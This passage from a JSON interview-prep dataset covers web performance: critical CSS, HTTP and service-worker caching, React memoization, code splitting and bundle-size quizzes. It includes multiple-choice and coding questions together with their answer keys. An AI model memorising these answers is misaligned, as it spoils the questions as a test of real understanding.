ensuring the stylesheet is still loaded, albeit synchronously.\n\n## Benefits\n-   **Improved First Contentful Paint (FCP)**: Users see content much faster.\n-   **Improved Largest Contentful Paint (LCP)**: Critical above-the-fold elements are styled quickly.\n-   **Reduced Render-Blocking Resources**: Prevents the browser from pausing rendering while waiting for external CSS files.\n-   **Better User Experience**: Faster perceived performance and a more immediate display of content.",
          "examples": [
            {
              "id": "example_critical_css_inline_async",
              "title": "Inlining Critical CSS and Asynchronous Loading",
              "code": "<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Critical CSS Example</title>\n\n  <style>\n    /* Critical CSS for above-the-fold content */\n    body { margin: 0; font-family: sans-serif; line-height: 1.6; color: #333; }\n    header { background: #f0f0f0; padding: 20px; text-align: center; border-bottom: 1px solid #ccc; }\n    h1 { color: #0056b3; margin-bottom: 10px; }\n  </style>\n  \n  <!-- Asynchronously load non-critical CSS -->\n  <link rel=\"preload\" href=\"styles.css\" as=\"style\" onload=\"this.onload=null;this.rel='stylesheet'\">\n  <noscript><link rel=\"stylesheet\" href=\"styles.css\"></noscript>\n</head>\n<body>\n  <header>\n    <h1>Welcome to Our Site</h1>\n  </header>\n  <main>\n    <p>This is some content that will be styled by both critical and non-critical CSS.</p>\n    <div class=\"below-the-fold\">\n      <p>This content is below the fold and its styles are loaded asynchronously.</p>\n    </div>\n  </main>\n</body>",
              "explanation": "This example demonstrates critical CSS optimization. The essential styles for the `body`, `header`, and `h1` (which are likely visible immediately) are inlined directly within a `<style>` tag in the `<head>`. This ensures they are available without a network request. The main stylesheet (`styles.css`), containing less critical styles, is preloaded asynchronously. It's fetched in the background (`rel=\"preload\"`), and once loaded, its `rel` attribute is changed to `stylesheet` to apply the styles. A `<noscript>` tag provides a synchronous fallback for environments where JavaScript is disabled.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_critical_css_1",
            "question_critical_css_2",
            "question_critical_css_3",
            "question_critical_css_4",
            "question_critical_css_5"
          ],
          "relatedTasks": [
            "task_critical_css_1"
          ],
          "tags": [
            "CSS",
            "Performance",
            "FCP",
            "LCP",
            "Rendering",
            "Optimization",
            "HTML"
          ],
          "technology": "HTML/CSS",
          "prerequisites": [
            "html_basics",
            "css_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "web_performance_optimization",
            "frontend_architecture"
          ]
        },
        {
          "id": "theory_caching_strategies",
          "title": "Caching Strategies: HTTP Caching and Service Workers",
          "content": "Caching is a fundamental web performance optimization technique that stores copies of files (like HTML, CSS, JavaScript, images) closer to the user, either on the user's browser, a proxy server, or a Content Delivery Network (CDN). This reduces the need to re-download resources, significantly speeding up subsequent page loads.\n\n## Key Concepts\n-   **HTTP Caching (Browser Caching)**: Controlled by HTTP headers sent by the server. The browser stores these resources locally according to the rules defined in the headers.\n    *   **`Cache-Control` header**: The most important header for defining caching policies.\n        *   `public`: Indicates that the response can be cached by any cache (e.g., browser, CDN, proxy).\n        *   `private`: Indicates that the response is for a single user and cannot be cached by shared caches.\n        *   `no-cache`: The browser must revalidate with the server before using a cached copy (e.g., via `If-None-Match` or `If-Modified-Since`). It doesn't mean 'no caching', but 'revalidate before using'.\n        *   `no-store`: Absolutely no caching. The response should not be stored in any cache.\n        *   `max-age=<seconds>`: Specifies the maximum amount of time a resource is considered fresh. After this time, the browser must revalidate or re-download.\n        *   `immutable`: Indicates that the resource will not change during its lifetime. Once cached, it won't be revalidated for the `max-age` duration, even on page reloads. Useful for assets with content-hashed filenames (e.g., `bundle.abc123.js`).\n    *   **`Expires` header**: An older header providing a fixed expiry date/time. Less flexible than `Cache-Control`.\n    *   **`ETag` and `Last-Modified`**: Used for revalidation. If a resource is stale, the browser sends these in a request to the server. If the resource hasn't changed, the server responds with a `304 Not Modified`, saving bandwidth.\n\n-   **Service Workers**: A JavaScript file that runs in the background, separate from the main browser thread. It acts as a programmable proxy between the browser and the network. Service Workers can intercept network requests, cache responses, and serve content even when offline.\n    *   **Event-driven**: Responds to events like `install`, `activate`, and `fetch`.\n    *   **`install` event**: Typically used to pre-cache essential assets (App Shell).\n    *   **`activate` event**: Used for cleaning up old caches.\n    *   **`fetch` event**: The core of service worker caching. It allows you to intercept network requests and decide how to respond (e.g., 'Cache First, then Network', 'Network First', 'Stale While Revalidate').\n    *   **`caches` API**: Provides access to a `CacheStorage` object, which manages named `Cache` objects. Used to `put` (store), `match` (retrieve), and `delete` (remove) responses.\n\n## Common Caching Strategies with Service Workers\n-   **Cache First, then Network**: Serve from cache if available, otherwise fetch from network. Update cache in the background.\n-   **Network First, then Cache**: Try to fetch from network. If successful, update cache. If network fails, serve from cache.\n-   **Stale While Revalidate**: Serve from cache immediately, and in parallel, fetch from the network to update the cache for future requests.\n-   **Cache Only**: Serve only from cache (useful for static assets pre-cached during install).\n-   **Network Only**: Always go to the network (useful for non-cacheable requests).\n\n## Benefits\n-   **Improved Performance**: Faster load times, especially for repeat visitors.\n-   **Offline Capabilities**: Service Workers enable Progressive Web Apps (PWAs) to work offline.\n-   **Reduced Server Load**: Fewer requests hitting the origin server.\n-   **Bandwidth Saving**: Less data transferred.",
          "examples": [
            {
              "id": "example_caching_http_headers",
              "title": "HTTP Cache-Control Headers",
              "code": "// Node.js Express example for setting Cache-Control headers\nconst express = require('express');\nconst app = express();\n\napp.get('/static-asset.js', (req, res) => {\n  // Cache for 1 year (31536000 seconds) and mark as immutable\n  res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');\n  res.send('console.log(\"This asset is cached for a year!\");');\n});\n\napp.get('/dynamic-data', (req, res) => {\n  // Do not cache this response at all\n  res.setHeader('Cache-Control', 'no-store, must-revalidate');\n  res.setHeader('Pragma', 'no-cache'); // For HTTP/1.0 compatibility\n  res.setHeader('Expires', '0'); // For HTTP/1.0 compatibility\n  res.json({ message: 'This data is always fresh.' });\n});\n\n// Start server...\napp.listen(3000, () => console.log('Server running on port 3000'));",
              "explanation": "This Node.js Express example demonstrates setting HTTP `Cache-Control` headers. For a static asset, `public, max-age=31536000, immutable` tells browsers and proxy servers to cache the asset for one year without revalidating. For dynamic data, `no-store, must-revalidate` (along with `Pragma` and `Expires` for older clients) explicitly prevents any caching, forcing the browser to always fetch a fresh copy from the server.",
              "language": "javascript"
            },
            {
              "id": "example_caching_service_worker",
              "title": "Service Worker Cache-First Strategy",
              "code": "// service-worker.js\nconst CACHE_NAME = 'v1';\nconst urlsToCache = [\n  '/',\n  '/index.html',\n  '/styles.css',\n  '/script.js'\n];\n\n// Install event: pre-cache static assets\nself.addEventListener('install', event => {\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(cache => {\n        console.log('Opened cache');\n        return cache.addAll(urlsToCache);\n      })\n  );\n});\n\n// Fetch event: intercept network requests and serve from cache if available\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    caches.match(event.request).then(cachedResponse => {\n      // Return cached response if available\n      if (cachedResponse) {\n        console.log('Serving from cache:', event.request.url);\n        return cachedResponse;\n      }\n\n      // Otherwise, fetch from network\n      return fetch(event.request).then(response => {\n        // Check if we received a valid response\n        if (!response || response.status !== 200 || response.type !== 'basic') {\n          return response;\n        }\n\n        // Clone the response because it's a stream and can only be consumed once\n        const responseToCache = response.clone();\n\n        caches.open(CACHE_NAME).then(cache => {\n          cache.put(event.request, responseToCache);\n        });\n\n        return response;\n      });\n    })\n  );\n});\n\n// Activate event: clean up old caches\nself.addEventListener('activate', event => {\n  const cacheWhitelist = [CACHE_NAME];\n  event.waitUntil(\n    caches.keys().then(cacheNames => {\n      return Promise.all(\n        cacheNames.map(cacheName => {\n          if (cacheWhitelist.indexOf(cacheName) === -1) {\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n});",
              "explanation": "This Service Worker implements a 'Cache First, then Network' strategy. During the `install` phase, essential static assets are pre-cached. In the `fetch` event listener, every network request is intercepted. The Service Worker first checks if a matching response exists in its cache (`caches.match`). If found, it returns the cached version immediately. If not, it fetches the resource from the network, caches a clone of the response for future use, and then returns the network response. The `activate` event handles cleaning up old cache versions.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_caching_1",
            "question_caching_2",
            "question_caching_3",
            "question_caching_4",
            "question_caching_5",
            "question_caching_6",
            "question_caching_7",
            "question_caching_8"
          ],
          "relatedTasks": [
            "task_caching_1"
          ],
          "tags": [
            "Caching",
            "HTTP",
            "Service Worker",
            "Performance",
            "Web Development",
            "PWA",
            "Offline",
            "Network"
          ],
          "technology": "Web APIs",
          "prerequisites": [
            "http_basics",
            "javascript_async_programming"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "pwa_development",
            "advanced_web_performance"
          ]
        },
        {
          "id": "theory_react_memoization",
          "title": "React Performance Optimization: Memoization with React.memo, useCallback, and useMemo",
          "content": "In React, component re-renders are a common cause of performance bottlenecks, especially in large applications. Memoization is an optimization technique that helps prevent unnecessary re-renders of components or recalculations of values and functions by caching their results. If the inputs (props or dependencies) remain the same, the cached result is returned instead of re-executing the logic or re-rendering.\n\n## Key Concepts\n-   **Why Memoization?**: React re-renders components when their state or props change. However, sometimes parent components re-render, causing their children to re-render even if the children's props haven't *logically* changed (e.g., if an object prop is recreated on every parent render, leading to a new reference). Memoization helps by performing a shallow comparison of props/dependencies and skipping re-renders/re-calculations if they are identical.\n\n-   **`React.memo` (for functional components)**:\n    *   A higher-order component (HOC) that memoizes a functional component. It prevents the component from re-rendering if its props have not changed (via a shallow comparison).\n    *   Use when your component renders the same result given the same props, and it re-renders frequently due to parent re-renders without its own props truly changing.\n    *   Syntax: `const MemoizedComponent = React.memo(MyFunctionalComponent, [arePropsEqual])`.\n\n-   **`useCallback` (for memoizing functions)**:\n    *   A React Hook that returns a memoized version of a callback function. This is particularly useful when passing callbacks to optimized child components that rely on reference equality to prevent unnecessary re-renders (e.g., `React.memo` components).\n    *   Syntax: `const memoizedCallback = useCallback(() => { doSomething(); }, [dependencies]);`\n    *   The callback will only change if one of its `dependencies` has changed.\n\n-   **`useMemo` (for memoizing values)**:\n    *   A React Hook that returns a memoized value. It only recomputes the memoized value when one of the `dependencies` has changed.\n    *   Syntax: `const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);`\n    *   Useful for expensive calculations or for memoizing objects/arrays that are passed as props to child components, preventing unnecessary re-renders of those children.\n\n## When to Use Memoization\n-   **Large, frequently re-rendering components**: If a component has complex UI or expensive rendering logic and re-renders often.\n-   **Passing props to memoized children**: When a parent component renders, it re-creates function/object props, which can cause `React.memo` children to re-render. `useCallback` and `useMemo` help stabilize these references.\n-   **Expensive computations**: For calculations that take a significant amount of time and whose results are only dependent on a few inputs.\n\n## Potential Pitfalls / When Not to Use\n-   **Over-optimization**: Memoization itself has a cost (comparison of props/dependencies, memory for caching). If the rendering is cheap, the overhead of memoization might be greater than the benefit.\n-   **Mutable Objects**: Memoization relies on shallow comparison. If you mutate an object or array passed as a prop, memoization might not detect the change, leading to stale UI.\n-   **Incorrect Dependencies**: Forgetting to include a dependency in `useCallback` or `useMemo` will lead to stale closures or values. Including too many dependencies can negate the benefits.",
          "examples": [
            {
              "id": "example_react_memo_component",
              "title": "React.memo for Component Memoization",
              "code": "import React, { useState, useCallback, useMemo } from 'react';\n\n// Child component that is expensive to render or re-render\nconst ExpensiveChild = React.memo(({ data, onClick }) => {\n  console.log('ExpensiveChild rendered', data);\n  return (\n    <div style={{ border: '1px solid blue', padding: '10px', margin: '10px' }}>\n      <h3>Memoized Child Component</h3>\n      <p>Data: {data}</p>\n      <button onClick={onClick}>Click me</button>\n    </div>\n  );\n});\n\n// Parent Component\nconst ParentComponent = () => {\n  const [count, setCount] = useState(0);\n  const [text, setText] = useState('');\n\n  // Memoize the callback function using useCallback\n  // This function will only be recreated if `count` changes.\n  const handleClick = useCallback(() => {\n    setCount(prevCount => prevCount + 1);\n  }, []); // Empty dependency array means it's created once\n\n  // Memoize a value using useMemo\n  // This value will only be recomputed if `count` changes.\n  const processedData = useMemo(() => {\n    console.log('Recalculating processedData...');\n    return `Count: ${count * 2}`;\n  }, [count]);\n\n  return (\n    <div style={{ border: '1px solid green', padding: '20px' }}>\n      <h2>Parent Component</h2>\n      <p>Parent Count: {count}</p>\n      <input type=\"text\" value={text} onChange={(e) => setText(e.target.value)} placeholder=\"Type something\"/>\n      \n      {/* ExpensiveChild will only re-render if processedData or handleClick change their references */}\n      <ExpensiveChild data={processedData} onClick={handleClick} />\n    </div>\n  );\n};\n\nexport default ParentComponent;",
              "explanation": "This example demonstrates `React.memo`, `useCallback`, and `useMemo` working together. `ExpensiveChild` is wrapped with `React.memo`, meaning it will only re-render if its `data` or `onClick` props change (by shallow comparison). \n\n-   `processedData` is memoized with `useMemo`. It only recalculates when `count` changes. If `text` changes, `ParentComponent` re-renders, but `processedData` does not recompute, and its reference remains stable, preventing `ExpensiveChild` from re-rendering.\n-   `handleClick` is memoized with `useCallback`. With an empty dependency array `[]`, its reference is stable across parent renders. This is crucial for `ExpensiveChild` (a `React.memo` component) as it prevents unnecessary re-renders when the parent re-renders due to `text` state changes.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_react_memoization_1",
            "question_react_memoization_2",
            "question_react_memoization_3",
            "question_react_memoization_4",
            "question_react_memoization_5",
            "question_react_memoization_6",
            "question_react_memoization_7"
          ],
          "relatedTasks": [
            "task_react_memoization_1"
          ],
          "tags": [
            "React",
            "Performance",
            "Memoization",
            "Hooks",
            "Optimization",
            "useCallback",
            "useMemo",
            "React.memo"
          ],
          "technology": "React",
          "prerequisites": [
            "react_functional_components",
            "react_hooks_useState"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "react_performance_optimization",
            "large_scale_react_apps"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_react_code_splitting_1",
          "topic": "React Code Splitting",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of `React.lazy` in a React application?",
          "answer": "`React.lazy` allows you to load React components dynamically, only when they are needed, which helps in code splitting and reducing the initial bundle size of the application.",
          "analysisPoints": [
            "Understanding of code splitting concept.",
            "Role of `React.lazy` in dynamic imports.",
            "Impact on initial load performance."
          ],
          "keyConcepts": [
            "React.lazy",
            "Code Splitting",
            "Performance Optimization"
          ],
          "evaluationCriteria": [
            "Recall of `React.lazy` functionality"
          ],
          "example": null,
          "tags": [
            "React",
            "Code Splitting",
            "Performance",
            "Lazy Loading"
          ],
          "prerequisites": [
            "react_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_code_splitting_2",
          "topic": "React Code Splitting",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following React code snippet, what will happen when a user navigates to the `/about` path for the first time?\n\n```jsx\nimport React, { lazy, Suspense } from 'react';\nimport { BrowserRouter as Router, Route, Switch } from 'react-router-dom';\n\nconst Home = () => <div>Home Page</div>;\nconst About = lazy(() => import('./routes/About'));\n\nconst App = () => (\n  <Router>\n    <Suspense fallback={<div>Loading...</div>}>\n      <Switch>\n        <Route exact path=\"/\" component={Home}/>\n        <Route path=\"/about\" component={About}/>\n      </Switch>\n    </Suspense>\n  </Router>\n);\n```",
          "answer": "The browser will display 'Loading...' and then render the `About` component after its code chunk has been downloaded.",
          "options": [
            "The browser will immediately navigate to `/about` and display the `About` component.",
            "The browser will display 'Loading...' and then render the `About` component after its code chunk has been downloaded.",
            "An error will occur because `Suspense` is not properly configured.",
            "The `About` component's code will be loaded with the initial bundle, and it will render immediately."
          ],
          "analysisPoints": [
            "Understanding the interaction between `React.lazy` and `Suspense`.",
            "Knowledge of dynamic imports and network requests.",
            "Correctly identifying the fallback UI behavior."
          ],
          "keyConcepts": [
            "React.lazy",
            "Suspense",
            "Dynamic Import",
            "Code Splitting",
            "React Router"
          ],
          "evaluationCriteria": [
            "Ability to predict runtime behavior of lazy-loaded components"
          ],
          "example": "When the user navigates to `/about`, `React.lazy` initiates the dynamic import of `./routes/About`. While this import is in progress (downloading the JavaScript chunk), `Suspense` catches the loading state and renders its `fallback` prop (`<div>Loading...</div>`). Once the `About` component's code is downloaded and parsed, `Suspense` resolves, and the `About` component is rendered.",
          "tags": [
            "React",
            "Code Splitting",
            "Suspense",
            "Performance"
          ],
          "prerequisites": [
            "react_lazy",
            "react_suspense",
            "react_router"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_code_splitting_3",
          "topic": "React Code Splitting",
          "level": "hard",
          "type": "open",
          "question": "Explain the benefits of implementing code splitting in a large-scale React application. Discuss potential drawbacks or considerations when deciding whether to apply code splitting.",
          "answer": "Benefits of code splitting in large-scale React applications include:\n1.  **Reduced Initial Load Time**: Only necessary code chunks are loaded initially, making the first page view much faster. This directly impacts core web vitals like FCP (First Contentful Paint) and LCP (Largest Contentful Paint).\n2.  **Improved User Experience**: Users perceive the application as faster and more responsive, especially on slower networks. The use of `Suspense` provides visual feedback (loading indicators) instead of blank screens.\n3.  **Efficient Resource Utilization**: Less data is transferred over the network initially, saving bandwidth for users.\n4.  **Better Caching**: Smaller, distinct code chunks can be cached independently. If only one part of the application changes, only its corresponding chunk needs to be re-downloaded, leading to better cache invalidation and hit ratios for subsequent visits.\n\nPotential drawbacks or considerations:\n1.  **Increased Network Requests**: While initial bundle size is smaller, the total number of network requests might increase as chunks are fetched on demand. This could be problematic on high-latency networks if not managed carefully (e.g., prefetching).\n2.  **Configuration Complexity**: Setting up optimal code splitting with bundlers like Webpack can add complexity to the build configuration.\n3.  **Loading States Management**: Proper use of `Suspense` and fallback UIs is crucial. Poorly managed loading states can lead to awkward UI flashes or 'jumps'.\n4.  **Waterfall Effect**: If a lazy-loaded component itself depends on other large, non-lazy-loaded modules, it might still create a loading bottleneck.\n5.  **SEO Considerations**: Historically, search engine crawlers might have issues with JavaScript-dependent content if not rendered properly (e.g., server-side rendering or pre-rendering can mitigate this). However, modern crawlers are much better at executing JavaScript.\n6.  **Bundle Cohesion**: Over-splitting can lead to many small chunks, which might increase the overhead of network requests and connection setup. It's about finding the right balance.",
          "analysisPoints": [
            "Comprehensive understanding of code splitting's advantages.",
            "Awareness of practical challenges and trade-offs.",
            "Ability to articulate the impact on user experience and technical debt.",
            "Consideration of network performance and build tooling."
          ],
          "keyConcepts": [
            "Code Splitting",
            "React.lazy",
            "Suspense",
            "Performance Optimization",
            "Webpack",
            "User Experience",
            "Network Performance"
          ],
          "evaluationCriteria": [
            "Depth of explanation",
            "Identification of pros and cons",
            "Practical considerations"
          ],
          "example": null,
          "tags": [
            "React",
            "Code Splitting",
            "Performance",
            "Architecture",
            "Advanced"
          ],
          "prerequisites": [
            "react_lazy",
            "react_suspense",
            "webpack_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_code_splitting_4",
          "topic": "React Code Splitting",
          "level": "easy",
          "type": "flashcard",
          "question": "What component is used in React to display a fallback UI while a lazy-loaded component is being downloaded?",
          "answer": "`Suspense`",
          "analysisPoints": [
            "Direct recall of `Suspense` component's purpose."
          ],
          "keyConcepts": [
            "Suspense",
            "React.lazy"
          ],
          "evaluationCriteria": [
            "Recall of React components"
          ],
          "example": null,
          "tags": [
            "React",
            "Suspense",
            "Lazy Loading"
          ],
          "prerequisites": [
            "react_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_code_splitting_5",
          "topic": "React Code Splitting",
          "level": "medium",
          "type": "code",
          "question": "Refactor the following React component to use `React.lazy` and `Suspense` for the `Dashboard` component. Assume `Dashboard` is a large component that should only load when the user navigates to `/dashboard`.\n\n```jsx\nimport React from 'react';\nimport { BrowserRouter as Router, Route, Switch, Link } from 'react-router-dom';\n\nconst Home = () => <div><h1>Welcome Home!</h1><Link to=\"/dashboard\">Go to Dashboard</Link></div>;\nconst Dashboard = () => <div><h2>Dashboard Content</h2><p>Lots of widgets here...</p></div>;\n\nconst App = () => (\n  <Router>\n    <Switch>\n      <Route exact path=\"/\" component={Home}/>\n      <Route path=\"/dashboard\" component={Dashboard}/>\n    </Switch>\n  </Router>\n);\n\nexport default App;\n```",
          "answer": "```jsx\nimport React, { lazy, Suspense } from 'react';\nimport { BrowserRouter as Router, Route, Switch, Link } from 'react-router-dom';\n\nconst Home = () => <div><h1>Welcome Home!</h1><Link to=\"/dashboard\">Go to Dashboard</Link></div>;\n\n// Lazily load the Dashboard component\nconst Dashboard = lazy(() => import('./Dashboard'));\n\nconst App = () => (\n  <Router>\n    <Suspense fallback={<div>Loading Dashboard...</div>}> {/* Wrap routes using lazy with Suspense */}\n      <Switch>\n        <Route exact path=\"/\" component={Home}/>\n        <Route path=\"/dashboard\" component={Dashboard}/> {/* Use the lazy-loaded component */}\n      </Switch>\n    </Suspense>\n  </Router>\n);\n\nexport default App;\n\n// Assuming Dashboard.js would contain:\n// // Dashboard.js\n// import React from 'react';\n// const Dashboard = () => <div><h2>Dashboard Content</h2><p>Lots of widgets here...</p></div>;\n// export default Dashboard;\n```",
          "options": [],
          "analysisPoints": [
            "Correct application of `React.lazy` syntax for dynamic imports.",
            "Proper wrapping of routes or components with `Suspense`.",
            "Understanding of the `fallback` prop."
          ],
          "keyConcepts": [
            "React.lazy",
            "Suspense",
            "Code Splitting",
            "React Router"
          ],
          "evaluationCriteria": [
            "Syntactic correctness",
            "Functional implementation of code splitting"
          ],
          "example": null,
          "tags": [
            "React",
            "Code Splitting",
            "Suspense",
            "Coding",
            "Performance"
          ],
          "prerequisites": [
            "react_lazy",
            "react_suspense",
            "react_router"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_bundle_size_1",
          "topic": "Bundle Size Optimization",
          "level": "easy",
          "type": "flashcard",
          "question": "What is 'Tree Shaking' in the context of JavaScript bundle optimization?",
          "answer": "Tree Shaking, also known as 'dead code elimination', is a process that removes unused code from your final JavaScript bundle. It relies on ES module import/export statements.",
          "analysisPoints": [
            "Definition of Tree Shaking.",
            "Mechanism (dead code elimination).",
            "Prerequisite (ES Modules)."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "Bundle Optimization",
            "Webpack",
            "ES Modules"
          ],
          "evaluationCriteria": [
            "Recall of definition and mechanism"
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Performance",
            "Tree Shaking"
          ],
          "prerequisites": [
            "javascript_modules"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_bundle_size_2",
          "topic": "Bundle Size Optimization",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following Webpack configurations is most likely to enable or enhance Tree Shaking and general bundle size optimization?\n\n```javascript\n// Option A\nmodule.exports = {\n  mode: 'development',\n  optimization: {\n    minimize: false\n  }\n};\n\n// Option B\nmodule.exports = {\n  mode: 'production',\n  optimization: {\n    minimizer: [],\n    splitChunks: { chunks: 'async' }\n  }\n};\n\n// Option C\nmodule.exports = {\n  mode: 'production',\n  optimization: {\n    minimizer: [new (require('terser-webpack-plugin'))()],\n    splitChunks: { chunks: 'all' }\n  }\n};\n\n// Option D\nmodule.exports = {\n  mode: 'none',\n  optimization: {\n    minimize: true\n  }\n};\n```",
          "answer": "Option C",
          "options": [
            "Option A",
            "Option B",
            "Option C",
            "Option D"
          ],
          "analysisPoints": [
            "Understanding that `mode: 'production'` enables many optimizations by default, including tree shaking.",
            "Recognizing `TerserPlugin` for minification.",
            "Understanding `splitChunks: { chunks: 'all' }` for comprehensive code splitting."
          ],
          "keyConcepts": [
            "Webpack",
            "Tree Shaking",
            "Minification",
            "Code Splitting",
            "TerserPlugin"
          ],
          "evaluationCriteria": [
            "Ability to interpret Webpack configurations",
            "Knowledge of optimization options"
          ],
          "example": "Option C is correct because:\n-   `mode: 'production'` automatically enables many optimizations, including tree shaking and scope hoisting.\n-   `minimizer: [new TerserPlugin()]` explicitly configures JavaScript minification.\n-   `splitChunks: { chunks: 'all' }` is a powerful setting that ensures Webpack analyzes all module types (synchronous and asynchronous) for optimal chunking, leading to better cacheability and smaller initial downloads.\n\nOption A uses 'development' mode, which prioritizes speed and debugging over size. Option B uses 'production' but lacks a minimizer and uses a less comprehensive `splitChunks` configuration. Option D uses 'none' mode, which means no default optimizations are applied.",
          "tags": [
            "Webpack",
            "Bundle Size",
            "Optimization",
            "MCQ"
          ],
          "prerequisites": [
            "webpack_basics",
            "bundle_size_optimization"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_bundle_size_3",
          "topic": "Bundle Size Optimization",
          "level": "medium",
          "type": "open",
          "question": "Beyond `mode: 'production'`, `TerserPlugin`, and `splitChunks`, what other techniques or considerations can contribute to effective JavaScript bundle size optimization?",
          "answer": "Beyond the core techniques mentioned, several other approaches can significantly contribute to JavaScript bundle size optimization:\n1.  **Scope Hoisting (Module Concatenation)**: Webpack can flatten the scope of modules into a single scope, reducing wrapper function overhead and potentially making minification more effective. It's often enabled by default in `production` mode.\n2.  **Externalizing Libraries**: For libraries consumed via CDN (e.g., React, ReactDOM), you can configure Webpack to treat them as external, preventing them from being bundled into your application's code.\n3.  **Lazy Loading (Dynamic Imports)**: As discussed, loading components or modules only when they are needed via `import()` syntax. This is particularly effective for routes or features not accessed on initial load.\n4.  **Analyze Bundle Content**: Tools like Webpack Bundle Analyzer help visualize the contents of your bundle, identifying large dependencies or duplicated code that can be optimized.\n5.  **Code Splitting by Route/Feature**: Manually defining split points (e.g., using `import()` in React Router) to ensure that code for specific routes or features is loaded on demand.\n6.  **Removing Unused Dependencies**: Regularly review `package.json` to remove libraries that are no longer used or are redundant.\n7.  **Replacing Large Libraries with Lighter Alternatives**: Evaluate if a smaller, more focused library can replace a large, general-purpose one (e.g., Moment.js vs. date-fns).\n8.  **Server-Side Rendering (SSR) / Static Site Generation (SSG)**: While primarily for initial load performance and SEO, these can reduce the amount of JavaScript needed for initial render by pre-rendering HTML on the server.\n9.  **Brotli/Gzip Compression**: Ensure your server is configured to serve compressed assets (Brotli offers better compression than Gzip). This reduces the transfer size, even if the uncompressed bundle size remains the same.\n10. **Monorepo Structure**: If using a monorepo, ensure proper dependency management to avoid bundling shared libraries multiple times across different packages.",
          "analysisPoints": [
            "Identification of various advanced optimization techniques.",
            "Understanding of how each technique contributes to bundle reduction.",
            "Knowledge of debugging/analysis tools."
          ],
          "keyConcepts": [
            "Bundle Size",
            "Webpack",
            "Performance",
            "Code Optimization",
            "Lazy Loading",
            "SSR",
            "Compression"
          ],
          "evaluationCriteria": [
            "Breadth of knowledge",
            "Practical applicability of suggestions"
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Performance",
            "Optimization",
            "Advanced"
          ],
          "prerequisites": [
            "bundle_size_optimization"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_bundle_size_4",
          "topic": "Bundle Size Optimization",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the role of `TerserPlugin` in Webpack's optimization process?",
          "answer": "`TerserPlugin` is Webpack's JavaScript minimizer. Its role is to minify JavaScript code by removing whitespace, comments, and shortening variable names (uglification), thereby reducing the final bundle size.",
          "analysisPoints": [
            "Identify `TerserPlugin`'s function.",
            "Explain minification concept."
          ],
          "keyConcepts": [
            "TerserPlugin",
            "Minification",
            "Webpack",
            "Bundle Size"
          ],
          "evaluationCriteria": [
            "Recall of specific Webpack plugin"
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Performance",
            "Minification"
          ],
          "prerequisites": [
            "webpack_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_bundle_size_5",
          "topic": "Bundle Size Optimization",
          "level": "easy",
          "type": "mcq",
          "question": "Consider the following JavaScript module structure:\n\n```javascript\n// utils.js\nexport function calculateSum(a, b) { return a + b; }\nexport function calculateProduct(a, b) { return a * b; }\n\n// main.js\nimport { calculateSum } from './utils';\n\nconsole.log(calculateSum(5, 3));\n```\n\nIf this code is bundled with Webpack in `production` mode, what is the most likely outcome regarding the `calculateProduct` function?",
          "answer": "It will be removed from the final bundle due to tree shaking.",
          "options": [
            "It will be included in the bundle, but its name will be minified.",
            "It will cause a runtime error because it's not used.",
            "It will be removed from the final bundle due to tree shaking.",
            "It will be loaded asynchronously when `calculateProduct` is eventually called."
          ],
          "analysisPoints": [
            "Understanding of tree shaking's mechanism.",
            "Distinguishing between minification and dead code elimination.",
            "Recognizing that unused exported functions are removed in production."
          ],
          "keyConcepts": [
            "Tree Shaking",
            "Webpack",
            "Bundle Size",
            "ES Modules"
          ],
          "evaluationCriteria": [
            "Application of tree shaking concept to code"
          ],
          "example": "Because `calculateProduct` is exported but never imported or used in `main.js`, a bundler configured for production mode (like Webpack) will perform tree shaking and omit this unused function from the final JavaScript bundle. This helps reduce the overall file size.",
          "tags": [
            "Webpack",
            "Tree Shaking",
            "Bundle Size",
            "MCQ"
          ],
          "prerequisites": [
            "javascript_modules",
            "webpack_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_bundle_size_6",
          "topic": "Bundle Size Optimization",
          "level": "hard",
          "type": "code",
